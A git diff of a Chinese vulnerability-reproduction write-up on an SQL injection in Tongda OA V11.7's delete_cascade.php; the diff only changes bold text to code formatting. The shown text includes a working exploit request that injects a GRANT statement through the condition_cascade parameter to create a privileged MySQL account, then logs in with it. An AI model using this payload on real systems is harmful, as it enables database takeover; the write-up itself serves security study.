@@ -14,13 +14,13 @@
 
 ## 漏洞复现
 
-在 **general/hr/manage/query/delete_cascade.php** 文件中
+在 `general/hr/manage/query/delete_cascade.php` 文件中
 
 ![img](../../../.vuepress/public/img/tongdaoa-3.png)
 
 首先判断`$condition_cascade`是否为空，如果不为空，则将其中的`\'`替换为`'`。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用`addslashes`函数进行保护，如下：
 
-**inc/common.inc.php** 代码
+`inc/common.inc.php` 代码
 
 ![img](../../../.vuepress/public/img/tongdaoa-4.png)
 
@@ -36,7 +36,7 @@
 
 触发了通达OA的SQL注入拦截
 
-**inc/conn.php**文件中找到过滤机制如下:
+`inc/conn.php`文件中找到过滤机制如下:
 
 ![img](../../../.vuepress/public/img/tongdaoa-6.png)
 
@@ -70,11 +70,11 @@ grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH
 
 
 
-访问 **http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql. *TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION*
+访问 `http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql. *TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION*
 
 
 
-进入 **Myoa/mysql5/bin** 目录 执行 **mysql -upeiqi -p** 输入密码查询所有用户
+进入 `Myoa/mysql5/bin` 目录 执行 `mysql -upeiqi -p` 输入密码查询所有用户
 
 
 
